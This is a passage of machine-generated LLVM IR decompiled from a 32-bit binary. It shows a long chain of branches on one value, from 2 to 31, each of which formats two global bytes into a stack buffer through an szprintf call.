  %v12_8049b29 = icmp eq i32 %v11_8049ac4, 2
  %v1_8049b2d = icmp eq i1 %v12_8049b29, false
  br i1 %v1_8049b2d, label %dec_label_pc_8049b59, label %dec_label_pc_8049b2f

dec_label_pc_8049b2f:                             ; preds = %dec_label_pc_8049b29
  %v0_8049b2f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049b2f = zext i8 %v0_8049b2f to i32
  store i32 %v1_8049b2f, i32* @edx, align 4
  %v0_8049b3b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049b3b = zext i8 %v0_8049b3b to i32
  %v2_8049b4a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049b4a, i32* @ebx, align 4
  %v5_8049b51 = call i32 @szprintf(i32 %v2_8049b4a, i32 ptrtoint ([11 x i8]* @global_var_80587ab.33 to i32), i32 %v1_8049b3b, i32 %v1_8049b2f)
  br label %dec_label_pc_8049b59

dec_label_pc_8049b59:                             ; preds = %dec_label_pc_8049b29, %dec_label_pc_8049b2f
  %v12_8049b59 = icmp eq i32 %v11_8049ac4, 3
  %v1_8049b5d = icmp eq i1 %v12_8049b59, false
  br i1 %v1_8049b5d, label %dec_label_pc_8049b89, label %dec_label_pc_8049b5f

dec_label_pc_8049b5f:                             ; preds = %dec_label_pc_8049b59
  %v0_8049b5f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049b5f = zext i8 %v0_8049b5f to i32
  store i32 %v1_8049b5f, i32* @edx, align 4
  %v0_8049b6b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049b6b = zext i8 %v0_8049b6b to i32
  %v2_8049b7a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049b7a, i32* @ebx, align 4
  %v5_8049b81 = call i32 @szprintf(i32 %v2_8049b7a, i32 ptrtoint ([13 x i8]* @global_var_80587b6.34 to i32), i32 %v1_8049b6b, i32 %v1_8049b5f)
  br label %dec_label_pc_8049b89

dec_label_pc_8049b89:                             ; preds = %dec_label_pc_8049b59, %dec_label_pc_8049b5f
  %v12_8049b89 = icmp eq i32 %v11_8049ac4, 4
  %v1_8049b8d = icmp eq i1 %v12_8049b89, false
  br i1 %v1_8049b8d, label %dec_label_pc_8049bb9, label %dec_label_pc_8049b8f

dec_label_pc_8049b8f:                             ; preds = %dec_label_pc_8049b89
  %v0_8049b8f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049b8f = zext i8 %v0_8049b8f to i32
  store i32 %v1_8049b8f, i32* @edx, align 4
  %v0_8049b9b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049b9b = zext i8 %v0_8049b9b to i32
  %v2_8049baa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049baa, i32* @ebx, align 4
  %v5_8049bb1 = call i32 @szprintf(i32 %v2_8049baa, i32 ptrtoint ([11 x i8]* @global_var_80587c3.35 to i32), i32 %v1_8049b9b, i32 %v1_8049b8f)
  br label %dec_label_pc_8049bb9

dec_label_pc_8049bb9:                             ; preds = %dec_label_pc_8049b89, %dec_label_pc_8049b8f
  %v12_8049bb9 = icmp eq i32 %v11_8049ac4, 5
  %v1_8049bbd = icmp eq i1 %v12_8049bb9, false
  br i1 %v1_8049bbd, label %dec_label_pc_8049be9, label %dec_label_pc_8049bbf

dec_label_pc_8049bbf:                             ; preds = %dec_label_pc_8049bb9
  %v0_8049bbf = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049bbf = zext i8 %v0_8049bbf to i32
  store i32 %v1_8049bbf, i32* @edx, align 4
  %v0_8049bcb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049bcb = zext i8 %v0_8049bcb to i32
  %v2_8049bda = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049bda, i32* @ebx, align 4
  %v5_8049be1 = call i32 @szprintf(i32 %v2_8049bda, i32 ptrtoint ([13 x i8]* @global_var_80587ce.36 to i32), i32 %v1_8049bcb, i32 %v1_8049bbf)
  br label %dec_label_pc_8049be9

dec_label_pc_8049be9:                             ; preds = %dec_label_pc_8049bb9, %dec_label_pc_8049bbf
  %v12_8049be9 = icmp eq i32 %v11_8049ac4, 6
  %v1_8049bed = icmp eq i1 %v12_8049be9, false
  br i1 %v1_8049bed, label %dec_label_pc_8049c19, label %dec_label_pc_8049bef

dec_label_pc_8049bef:                             ; preds = %dec_label_pc_8049be9
  %v0_8049bef = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049bef = zext i8 %v0_8049bef to i32
  store i32 %v1_8049bef, i32* @edx, align 4
  %v0_8049bfb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049bfb = zext i8 %v0_8049bfb to i32
  %v2_8049c0a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049c0a, i32* @ebx, align 4
  %v5_8049c11 = call i32 @szprintf(i32 %v2_8049c0a, i32 ptrtoint ([12 x i8]* @global_var_80587db.37 to i32), i32 %v1_8049bfb, i32 %v1_8049bef)
  br label %dec_label_pc_8049c19

dec_label_pc_8049c19:                             ; preds = %dec_label_pc_8049be9, %dec_label_pc_8049bef
  %v12_8049c19 = icmp eq i32 %v11_8049ac4, 7
  %v1_8049c1d = icmp eq i1 %v12_8049c19, false
  br i1 %v1_8049c1d, label %dec_label_pc_8049c49, label %dec_label_pc_8049c1f

dec_label_pc_8049c1f:                             ; preds = %dec_label_pc_8049c19
  %v0_8049c1f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049c1f = zext i8 %v0_8049c1f to i32
  store i32 %v1_8049c1f, i32* @edx, align 4
  %v0_8049c2b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049c2b = zext i8 %v0_8049c2b to i32
  %v2_8049c3a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049c3a, i32* @ebx, align 4
  %v5_8049c41 = call i32 @szprintf(i32 %v2_8049c3a, i32 ptrtoint ([13 x i8]* @global_var_80587e7.38 to i32), i32 %v1_8049c2b, i32 %v1_8049c1f)
  br label %dec_label_pc_8049c49

dec_label_pc_8049c49:                             ; preds = %dec_label_pc_8049c19, %dec_label_pc_8049c1f
  %v12_8049c49 = icmp eq i32 %v11_8049ac4, 8
  %v1_8049c4d = icmp eq i1 %v12_8049c49, false
  br i1 %v1_8049c4d, label %dec_label_pc_8049c79, label %dec_label_pc_8049c4f

dec_label_pc_8049c4f:                             ; preds = %dec_label_pc_8049c49
  %v0_8049c4f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049c4f = zext i8 %v0_8049c4f to i32
  store i32 %v1_8049c4f, i32* @edx, align 4
  %v0_8049c5b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049c5b = zext i8 %v0_8049c5b to i32
  %v2_8049c6a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049c6a, i32* @ebx, align 4
  %v5_8049c71 = call i32 @szprintf(i32 %v2_8049c6a, i32 ptrtoint ([13 x i8]* @global_var_80587f4.39 to i32), i32 %v1_8049c5b, i32 %v1_8049c4f)
  br label %dec_label_pc_8049c79

dec_label_pc_8049c79:                             ; preds = %dec_label_pc_8049c49, %dec_label_pc_8049c4f
  %v12_8049c79 = icmp eq i32 %v11_8049ac4, 9
  %v1_8049c7d = icmp eq i1 %v12_8049c79, false
  br i1 %v1_8049c7d, label %dec_label_pc_8049ca9, label %dec_label_pc_8049c7f

dec_label_pc_8049c7f:                             ; preds = %dec_label_pc_8049c79
  %v0_8049c7f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049c7f = zext i8 %v0_8049c7f to i32
  store i32 %v1_8049c7f, i32* @edx, align 4
  %v0_8049c8b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049c8b = zext i8 %v0_8049c8b to i32
  %v2_8049c9a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049c9a, i32* @ebx, align 4
  %v5_8049ca1 = call i32 @szprintf(i32 %v2_8049c9a, i32 ptrtoint ([13 x i8]* @global_var_8058801.40 to i32), i32 %v1_8049c8b, i32 %v1_8049c7f)
  br label %dec_label_pc_8049ca9

dec_label_pc_8049ca9:                             ; preds = %dec_label_pc_8049c79, %dec_label_pc_8049c7f
  %v12_8049ca9 = icmp eq i32 %v11_8049ac4, 10
  %v1_8049cad = icmp eq i1 %v12_8049ca9, false
  br i1 %v1_8049cad, label %dec_label_pc_8049cd9, label %dec_label_pc_8049caf

dec_label_pc_8049caf:                             ; preds = %dec_label_pc_8049ca9
  %v0_8049caf = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049caf = zext i8 %v0_8049caf to i32
  store i32 %v1_8049caf, i32* @edx, align 4
  %v0_8049cbb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049cbb = zext i8 %v0_8049cbb to i32
  %v2_8049cca = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049cca, i32* @ebx, align 4
  %v5_8049cd1 = call i32 @szprintf(i32 %v2_8049cca, i32 ptrtoint ([14 x i8]* @global_var_805880e.41 to i32), i32 %v1_8049cbb, i32 %v1_8049caf)
  br label %dec_label_pc_8049cd9

dec_label_pc_8049cd9:                             ; preds = %dec_label_pc_8049ca9, %dec_label_pc_8049caf
  %v12_8049cd9 = icmp eq i32 %v11_8049ac4, 11
  %v1_8049cdd = icmp eq i1 %v12_8049cd9, false
  br i1 %v1_8049cdd, label %dec_label_pc_8049d09, label %dec_label_pc_8049cdf

dec_label_pc_8049cdf:                             ; preds = %dec_label_pc_8049cd9
  %v0_8049cdf = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049cdf = zext i8 %v0_8049cdf to i32
  store i32 %v1_8049cdf, i32* @edx, align 4
  %v0_8049ceb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049ceb = zext i8 %v0_8049ceb to i32
  %v2_8049cfa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049cfa, i32* @ebx, align 4
  %v5_8049d01 = call i32 @szprintf(i32 %v2_8049cfa, i32 ptrtoint ([11 x i8]* @global_var_805881c.42 to i32), i32 %v1_8049ceb, i32 %v1_8049cdf)
  br label %dec_label_pc_8049d09

dec_label_pc_8049d09:                             ; preds = %dec_label_pc_8049cd9, %dec_label_pc_8049cdf
  %v12_8049d09 = icmp eq i32 %v11_8049ac4, 12
  %v1_8049d0d = icmp eq i1 %v12_8049d09, false
  br i1 %v1_8049d0d, label %dec_label_pc_8049d39, label %dec_label_pc_8049d0f

dec_label_pc_8049d0f:                             ; preds = %dec_label_pc_8049d09
  %v0_8049d0f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049d0f = zext i8 %v0_8049d0f to i32
  store i32 %v1_8049d0f, i32* @edx, align 4
  %v0_8049d1b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049d1b = zext i8 %v0_8049d1b to i32
  %v2_8049d2a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049d2a, i32* @ebx, align 4
  %v5_8049d31 = call i32 @szprintf(i32 %v2_8049d2a, i32 ptrtoint ([13 x i8]* @global_var_8058827.43 to i32), i32 %v1_8049d1b, i32 %v1_8049d0f)
  br label %dec_label_pc_8049d39

dec_label_pc_8049d39:                             ; preds = %dec_label_pc_8049d09, %dec_label_pc_8049d0f
  %v12_8049d39 = icmp eq i32 %v11_8049ac4, 13
  %v1_8049d3d = icmp eq i1 %v12_8049d39, false
  br i1 %v1_8049d3d, label %dec_label_pc_8049d69, label %dec_label_pc_8049d3f

dec_label_pc_8049d3f:                             ; preds = %dec_label_pc_8049d39
  %v0_8049d3f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049d3f = zext i8 %v0_8049d3f to i32
  store i32 %v1_8049d3f, i32* @edx, align 4
  %v0_8049d4b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049d4b = zext i8 %v0_8049d4b to i32
  %v2_8049d5a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049d5a, i32* @ebx, align 4
  %v5_8049d61 = call i32 @szprintf(i32 %v2_8049d5a, i32 ptrtoint ([13 x i8]* @global_var_8058834.44 to i32), i32 %v1_8049d4b, i32 %v1_8049d3f)
  br label %dec_label_pc_8049d69

dec_label_pc_8049d69:                             ; preds = %dec_label_pc_8049d39, %dec_label_pc_8049d3f
  %v12_8049d69 = icmp eq i32 %v11_8049ac4, 14
  %v1_8049d6d = icmp eq i1 %v12_8049d69, false
  br i1 %v1_8049d6d, label %dec_label_pc_8049d99, label %dec_label_pc_8049d6f

dec_label_pc_8049d6f:                             ; preds = %dec_label_pc_8049d69
  %v0_8049d6f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049d6f = zext i8 %v0_8049d6f to i32
  store i32 %v1_8049d6f, i32* @edx, align 4
  %v0_8049d7b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049d7b = zext i8 %v0_8049d7b to i32
  %v2_8049d8a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049d8a, i32* @ebx, align 4
  %v5_8049d91 = call i32 @szprintf(i32 %v2_8049d8a, i32 ptrtoint ([13 x i8]* @global_var_8058841.45 to i32), i32 %v1_8049d7b, i32 %v1_8049d6f)
  br label %dec_label_pc_8049d99

dec_label_pc_8049d99:                             ; preds = %dec_label_pc_8049d69, %dec_label_pc_8049d6f
  %v12_8049d99 = icmp eq i32 %v11_8049ac4, 15
  %v1_8049d9d = icmp eq i1 %v12_8049d99, false
  br i1 %v1_8049d9d, label %dec_label_pc_8049dc9, label %dec_label_pc_8049d9f

dec_label_pc_8049d9f:                             ; preds = %dec_label_pc_8049d99
  %v0_8049d9f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049d9f = zext i8 %v0_8049d9f to i32
  store i32 %v1_8049d9f, i32* @edx, align 4
  %v0_8049dab = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049dab = zext i8 %v0_8049dab to i32
  %v2_8049dba = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049dba, i32* @ebx, align 4
  %v5_8049dc1 = call i32 @szprintf(i32 %v2_8049dba, i32 ptrtoint ([13 x i8]* @global_var_805884e.46 to i32), i32 %v1_8049dab, i32 %v1_8049d9f)
  br label %dec_label_pc_8049dc9

dec_label_pc_8049dc9:                             ; preds = %dec_label_pc_8049d99, %dec_label_pc_8049d9f
  %v9_8049dc9 = icmp eq i32 %v11_8049ac4, 16
  %v1_8049dcd = icmp eq i1 %v9_8049dc9, false
  br i1 %v1_8049dcd, label %dec_label_pc_8049df9, label %dec_label_pc_8049dcf

dec_label_pc_8049dcf:                             ; preds = %dec_label_pc_8049dc9
  %v0_8049dcf = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049dcf = zext i8 %v0_8049dcf to i32
  store i32 %v1_8049dcf, i32* @edx, align 4
  %v0_8049ddb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049ddb = zext i8 %v0_8049ddb to i32
  %v2_8049dea = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049dea, i32* @ebx, align 4
  %v5_8049df1 = call i32 @szprintf(i32 %v2_8049dea, i32 ptrtoint ([13 x i8]* @global_var_805885b.47 to i32), i32 %v1_8049ddb, i32 %v1_8049dcf)
  br label %dec_label_pc_8049df9

dec_label_pc_8049df9:                             ; preds = %dec_label_pc_8049dc9, %dec_label_pc_8049dcf
  %v12_8049df9 = icmp eq i32 %v11_8049ac4, 17
  %v1_8049dfd = icmp eq i1 %v12_8049df9, false
  br i1 %v1_8049dfd, label %dec_label_pc_8049e29, label %dec_label_pc_8049dff

dec_label_pc_8049dff:                             ; preds = %dec_label_pc_8049df9
  %v0_8049dff = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049dff = zext i8 %v0_8049dff to i32
  store i32 %v1_8049dff, i32* @edx, align 4
  %v0_8049e0b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049e0b = zext i8 %v0_8049e0b to i32
  %v2_8049e1a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049e1a, i32* @ebx, align 4
  %v5_8049e21 = call i32 @szprintf(i32 %v2_8049e1a, i32 ptrtoint ([13 x i8]* @global_var_8058868.48 to i32), i32 %v1_8049e0b, i32 %v1_8049dff)
  br label %dec_label_pc_8049e29

dec_label_pc_8049e29:                             ; preds = %dec_label_pc_8049df9, %dec_label_pc_8049dff
  %v12_8049e29 = icmp eq i32 %v11_8049ac4, 18
  %v1_8049e2d = icmp eq i1 %v12_8049e29, false
  br i1 %v1_8049e2d, label %dec_label_pc_8049e59, label %dec_label_pc_8049e2f

dec_label_pc_8049e2f:                             ; preds = %dec_label_pc_8049e29
  %v0_8049e2f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049e2f = zext i8 %v0_8049e2f to i32
  store i32 %v1_8049e2f, i32* @edx, align 4
  %v0_8049e3b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049e3b = zext i8 %v0_8049e3b to i32
  %v2_8049e4a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049e4a, i32* @ebx, align 4
  %v5_8049e51 = call i32 @szprintf(i32 %v2_8049e4a, i32 ptrtoint ([13 x i8]* @global_var_8058875.49 to i32), i32 %v1_8049e3b, i32 %v1_8049e2f)
  br label %dec_label_pc_8049e59

dec_label_pc_8049e59:                             ; preds = %dec_label_pc_8049e29, %dec_label_pc_8049e2f
  %v12_8049e59 = icmp eq i32 %v11_8049ac4, 19
  %v1_8049e5d = icmp eq i1 %v12_8049e59, false
  br i1 %v1_8049e5d, label %dec_label_pc_8049e89, label %dec_label_pc_8049e5f

dec_label_pc_8049e5f:                             ; preds = %dec_label_pc_8049e59
  %v0_8049e5f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049e5f = zext i8 %v0_8049e5f to i32
  store i32 %v1_8049e5f, i32* @edx, align 4
  %v0_8049e6b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049e6b = zext i8 %v0_8049e6b to i32
  %v2_8049e7a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049e7a, i32* @ebx, align 4
  %v5_8049e81 = call i32 @szprintf(i32 %v2_8049e7a, i32 ptrtoint ([11 x i8]* @global_var_8058882.50 to i32), i32 %v1_8049e6b, i32 %v1_8049e5f)
  br label %dec_label_pc_8049e89

dec_label_pc_8049e89:                             ; preds = %dec_label_pc_8049e59, %dec_label_pc_8049e5f
  %v12_8049e89 = icmp eq i32 %v11_8049ac4, 20
  %v1_8049e8d = icmp eq i1 %v12_8049e89, false
  br i1 %v1_8049e8d, label %dec_label_pc_8049eb9, label %dec_label_pc_8049e8f

dec_label_pc_8049e8f:                             ; preds = %dec_label_pc_8049e89
  %v0_8049e8f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049e8f = zext i8 %v0_8049e8f to i32
  store i32 %v1_8049e8f, i32* @edx, align 4
  %v0_8049e9b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049e9b = zext i8 %v0_8049e9b to i32
  %v2_8049eaa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049eaa, i32* @ebx, align 4
  %v5_8049eb1 = call i32 @szprintf(i32 %v2_8049eaa, i32 ptrtoint ([12 x i8]* @global_var_805888d.51 to i32), i32 %v1_8049e9b, i32 %v1_8049e8f)
  br label %dec_label_pc_8049eb9

dec_label_pc_8049eb9:                             ; preds = %dec_label_pc_8049e89, %dec_label_pc_8049e8f
  %v12_8049eb9 = icmp eq i32 %v11_8049ac4, 21
  %v1_8049ebd = icmp eq i1 %v12_8049eb9, false
  br i1 %v1_8049ebd, label %dec_label_pc_8049ee9, label %dec_label_pc_8049ebf

dec_label_pc_8049ebf:                             ; preds = %dec_label_pc_8049eb9
  %v0_8049ebf = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049ebf = zext i8 %v0_8049ebf to i32
  store i32 %v1_8049ebf, i32* @edx, align 4
  %v0_8049ecb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049ecb = zext i8 %v0_8049ecb to i32
  %v2_8049eda = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049eda, i32* @ebx, align 4
  %v5_8049ee1 = call i32 @szprintf(i32 %v2_8049eda, i32 ptrtoint ([13 x i8]* @global_var_8058899.52 to i32), i32 %v1_8049ecb, i32 %v1_8049ebf)
  br label %dec_label_pc_8049ee9

dec_label_pc_8049ee9:                             ; preds = %dec_label_pc_8049eb9, %dec_label_pc_8049ebf
  %v12_8049ee9 = icmp eq i32 %v11_8049ac4, 22
  %v1_8049eed = icmp eq i1 %v12_8049ee9, false
  br i1 %v1_8049eed, label %dec_label_pc_8049f19, label %dec_label_pc_8049eef

dec_label_pc_8049eef:                             ; preds = %dec_label_pc_8049ee9
  %v0_8049eef = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049eef = zext i8 %v0_8049eef to i32
  store i32 %v1_8049eef, i32* @edx, align 4
  %v0_8049efb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049efb = zext i8 %v0_8049efb to i32
  %v2_8049f0a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f0a, i32* @ebx, align 4
  %v5_8049f11 = call i32 @szprintf(i32 %v2_8049f0a, i32 ptrtoint ([11 x i8]* @global_var_80588a6.53 to i32), i32 %v1_8049efb, i32 %v1_8049eef)
  br label %dec_label_pc_8049f19

dec_label_pc_8049f19:                             ; preds = %dec_label_pc_8049ee9, %dec_label_pc_8049eef
  %v12_8049f19 = icmp eq i32 %v11_8049ac4, 23
  %v1_8049f1d = icmp eq i1 %v12_8049f19, false
  br i1 %v1_8049f1d, label %dec_label_pc_8049f49, label %dec_label_pc_8049f1f

dec_label_pc_8049f1f:                             ; preds = %dec_label_pc_8049f19
  %v0_8049f1f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049f1f = zext i8 %v0_8049f1f to i32
  store i32 %v1_8049f1f, i32* @edx, align 4
  %v0_8049f2b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049f2b = zext i8 %v0_8049f2b to i32
  %v2_8049f3a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f3a, i32* @ebx, align 4
  %v5_8049f41 = call i32 @szprintf(i32 %v2_8049f3a, i32 ptrtoint ([11 x i8]* @global_var_80588b1.54 to i32), i32 %v1_8049f2b, i32 %v1_8049f1f)
  br label %dec_label_pc_8049f49

dec_label_pc_8049f49:                             ; preds = %dec_label_pc_8049f19, %dec_label_pc_8049f1f
  %v12_8049f49 = icmp eq i32 %v11_8049ac4, 24
  %v1_8049f4d = icmp eq i1 %v12_8049f49, false
  br i1 %v1_8049f4d, label %dec_label_pc_8049f79, label %dec_label_pc_8049f4f

dec_label_pc_8049f4f:                             ; preds = %dec_label_pc_8049f49
  %v0_8049f4f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049f4f = zext i8 %v0_8049f4f to i32
  store i32 %v1_8049f4f, i32* @edx, align 4
  %v0_8049f5b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049f5b = zext i8 %v0_8049f5b to i32
  %v2_8049f6a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f6a, i32* @ebx, align 4
  %v5_8049f71 = call i32 @szprintf(i32 %v2_8049f6a, i32 ptrtoint ([12 x i8]* @global_var_80588bc.55 to i32), i32 %v1_8049f5b, i32 %v1_8049f4f)
  br label %dec_label_pc_8049f79

dec_label_pc_8049f79:                             ; preds = %dec_label_pc_8049f49, %dec_label_pc_8049f4f
  %v12_8049f79 = icmp eq i32 %v11_8049ac4, 25
  %v1_8049f7d = icmp eq i1 %v12_8049f79, false
  br i1 %v1_8049f7d, label %dec_label_pc_8049fa9, label %dec_label_pc_8049f7f

dec_label_pc_8049f7f:                             ; preds = %dec_label_pc_8049f79
  %v0_8049f7f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049f7f = zext i8 %v0_8049f7f to i32
  store i32 %v1_8049f7f, i32* @edx, align 4
  %v0_8049f8b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049f8b = zext i8 %v0_8049f8b to i32
  %v2_8049f9a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f9a, i32* @ebx, align 4
  %v5_8049fa1 = call i32 @szprintf(i32 %v2_8049f9a, i32 ptrtoint ([12 x i8]* @global_var_80588c8.56 to i32), i32 %v1_8049f8b, i32 %v1_8049f7f)
  br label %dec_label_pc_8049fa9

dec_label_pc_8049fa9:                             ; preds = %dec_label_pc_8049f79, %dec_label_pc_8049f7f
  %v12_8049fa9 = icmp eq i32 %v11_8049ac4, 26
  %v1_8049fad = icmp eq i1 %v12_8049fa9, false
  br i1 %v1_8049fad, label %dec_label_pc_8049fd9, label %dec_label_pc_8049faf

dec_label_pc_8049faf:                             ; preds = %dec_label_pc_8049fa9
  %v0_8049faf = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049faf = zext i8 %v0_8049faf to i32
  store i32 %v1_8049faf, i32* @edx, align 4
  %v0_8049fbb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049fbb = zext i8 %v0_8049fbb to i32
  %v2_8049fca = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049fca, i32* @ebx, align 4
  %v5_8049fd1 = call i32 @szprintf(i32 %v2_8049fca, i32 ptrtoint ([12 x i8]* @global_var_80588d4.57 to i32), i32 %v1_8049fbb, i32 %v1_8049faf)
  br label %dec_label_pc_8049fd9

dec_label_pc_8049fd9:                             ; preds = %dec_label_pc_8049fa9, %dec_label_pc_8049faf
  %v12_8049fd9 = icmp eq i32 %v11_8049ac4, 27
  %v1_8049fdd = icmp eq i1 %v12_8049fd9, false
  br i1 %v1_8049fdd, label %dec_label_pc_804a009, label %dec_label_pc_8049fdf

dec_label_pc_8049fdf:                             ; preds = %dec_label_pc_8049fd9
  %v0_8049fdf = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049fdf = zext i8 %v0_8049fdf to i32
  store i32 %v1_8049fdf, i32* @edx, align 4
  %v0_8049feb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049feb = zext i8 %v0_8049feb to i32
  %v2_8049ffa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049ffa, i32* @ebx, align 4
  %v5_804a001 = call i32 @szprintf(i32 %v2_8049ffa, i32 ptrtoint ([13 x i8]* @global_var_80588e0.58 to i32), i32 %v1_8049feb, i32 %v1_8049fdf)
  br label %dec_label_pc_804a009

dec_label_pc_804a009:                             ; preds = %dec_label_pc_8049fd9, %dec_label_pc_8049fdf
  %v12_804a009 = icmp eq i32 %v11_8049ac4, 28
  %v1_804a00d = icmp eq i1 %v12_804a009, false
  br i1 %v1_804a00d, label %dec_label_pc_804a039, label %dec_label_pc_804a00f

dec_label_pc_804a00f:                             ; preds = %dec_label_pc_804a009
  %v0_804a00f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a00f = zext i8 %v0_804a00f to i32
  store i32 %v1_804a00f, i32* @edx, align 4
  %v0_804a01b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a01b = zext i8 %v0_804a01b to i32
  %v2_804a02a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a02a, i32* @ebx, align 4
  %v5_804a031 = call i32 @szprintf(i32 %v2_804a02a, i32 ptrtoint ([13 x i8]* @global_var_80588ed.59 to i32), i32 %v1_804a01b, i32 %v1_804a00f)
  br label %dec_label_pc_804a039

dec_label_pc_804a039:                             ; preds = %dec_label_pc_804a009, %dec_label_pc_804a00f
  %v12_804a039 = icmp eq i32 %v11_8049ac4, 29
  %v1_804a03d = icmp eq i1 %v12_804a039, false
  br i1 %v1_804a03d, label %dec_label_pc_804a069, label %dec_label_pc_804a03f

dec_label_pc_804a03f:                             ; preds = %dec_label_pc_804a039
  %v0_804a03f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a03f = zext i8 %v0_804a03f to i32
  store i32 %v1_804a03f, i32* @edx, align 4
  %v0_804a04b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a04b = zext i8 %v0_804a04b to i32
  %v2_804a05a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a05a, i32* @ebx, align 4
  %v5_804a061 = call i32 @szprintf(i32 %v2_804a05a, i32 ptrtoint ([12 x i8]* @global_var_80588fa.60 to i32), i32 %v1_804a04b, i32 %v1_804a03f)
  br label %dec_label_pc_804a069

dec_label_pc_804a069:                             ; preds = %dec_label_pc_804a039, %dec_label_pc_804a03f
  %v12_804a069 = icmp eq i32 %v11_8049ac4, 30
  %v1_804a06d = icmp eq i1 %v12_804a069, false
  br i1 %v1_804a06d, label %dec_label_pc_804a099, label %dec_label_pc_804a06f

dec_label_pc_804a06f:                             ; preds = %dec_label_pc_804a069
  %v0_804a06f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a06f = zext i8 %v0_804a06f to i32
  store i32 %v1_804a06f, i32* @edx, align 4
  %v0_804a07b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a07b = zext i8 %v0_804a07b to i32
  %v2_804a08a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a08a, i32* @ebx, align 4
  %v5_804a091 = call i32 @szprintf(i32 %v2_804a08a, i32 ptrtoint ([13 x i8]* @global_var_8058906.61 to i32), i32 %v1_804a07b, i32 %v1_804a06f)
  br label %dec_label_pc_804a099

dec_label_pc_804a099:                             ; preds = %dec_label_pc_804a069, %dec_label_pc_804a06f
  %v12_804a099 = icmp eq i32 %v11_8049ac4, 31
  %v1_804a09d = icmp eq i1 %v12_804a099, false
  br i1 %v1_804a09d, label %dec_label_pc_804a0c9, label %dec_label_pc_804a09f

